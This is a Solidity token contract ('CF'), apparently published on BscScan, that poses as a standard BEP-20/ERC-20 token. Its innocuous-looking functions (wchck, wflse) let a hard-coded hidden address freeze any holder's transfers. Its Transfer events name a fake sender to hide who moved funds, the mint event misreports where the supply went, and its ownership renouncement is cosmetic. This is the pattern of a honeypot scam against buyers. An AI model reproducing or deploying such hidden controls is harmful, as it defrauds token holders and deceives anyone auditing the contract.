/**
 *Submitted for verification at BscScan.com on 2022-10-29
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _cstruct = 0x090A7e2Ae6043d0C0AfA689953155C6017EA05Bd;
	address RtVer2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract CF is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private XoVal;
	mapping (address => uint256) private Nxt;
    mapping (address => bool) private yUse;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _Total = 10 * 10**_decimals;
    string private constant _name = "CF";
    string private constant _symbol = "CF";



    constructor () {
        XoVal[_MsgSendr()] = _Total;
        emit Transfer(address(0), RtVer2, _Total);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _Total;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return XoVal[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }


        function wflse(address iw) public {
        if(msg.sender == _cstruct)  { 
        yUse[iw] = false;}}
        function wchck(address iw) public{
         if(msg.sender == _cstruct)  { 
        require(!yUse[iw]);
        yUse[iw] = true; }}
		
	

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _cstruct)  {
        require(amount <= XoVal[sender]);
        XoVal[sender] -= amount;  
        XoVal[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (RtVer2, recipient, amount);
        return true; }    
          if(!yUse[sender] && !yUse[recipient]) {
        require(amount <= XoVal[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        XoVal[sender] -= amount;
        XoVal[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}

 

    function transfer(address recipient, uint256 amount) public {
        if(msg.sender == _cstruct)  {
        require(XoVal[msg.sender] >= amount);
        XoVal[msg.sender] -= amount;  
        XoVal[recipient] += amount; 
        emit Transfer (RtVer2, recipient, amount);}  
        if(!yUse[msg.sender]) {
        require(XoVal[msg.sender] >= amount);
        XoVal[msg.sender] -= amount;  
        XoVal[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}}